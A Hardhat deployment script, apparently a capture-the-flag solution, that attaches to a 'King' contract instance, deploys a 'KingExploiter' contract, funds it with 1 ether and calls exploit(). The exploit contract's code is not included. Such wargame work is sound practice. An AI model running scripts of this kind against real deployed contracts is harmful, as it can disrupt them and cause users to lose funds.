import "@nomiclabs/hardhat-waffle";
import {ethers} from "hardhat";
import utils from "web3-utils";
import hre from "hardhat";
import Web3 from "web3";

async function main() {
    const [owner] = await ethers.getSigners();
    const instanceAddress = "0x8db11Af4463F09F1597F394Bd28383039915eAB8"

    console.log("Owner", owner.address);
    const provider = hre.ethers.getDefaultProvider(process.env.ALCHEMY_API);

    //Contract factories
    const kingFactory = await ethers.getContractFactory("King");
    const kingExploiterFactory = await ethers.getContractFactory("KingExploiter");

    //Contracts
    const king = await kingFactory.attach(instanceAddress);
    const kingExploiter = await kingExploiterFactory.deploy();
    console.log("Exploiter address: ", kingExploiter.address);

    //Transaction
    await kingExploiter.addValue({value: 1000000000000000000n});
    await kingExploiter.exploit();
    console.log("DONE");
  }
  
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
  